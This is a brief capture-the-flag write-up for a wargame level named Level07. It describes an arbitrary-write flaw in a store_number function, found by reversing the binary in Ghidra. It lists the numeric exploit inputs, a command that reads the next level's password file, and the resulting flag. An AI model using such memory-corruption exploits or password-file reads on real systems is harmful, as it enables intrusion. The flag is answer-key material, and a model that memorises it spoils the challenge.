## Level07
## Source code
![level07_1.png](level07_1.png)
![level07_2.png](level07_2.png)
## Walkthrough
- We RE the executable with Ghidra.
- We can write wherever we want through the `store_number` function.
## Answer
	exec find_offset to get offset

	store
	4159090384
	1073741938

	store
	4160264172
	116

	quit

	cat /home/users/level08/.pass
## Flag
	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC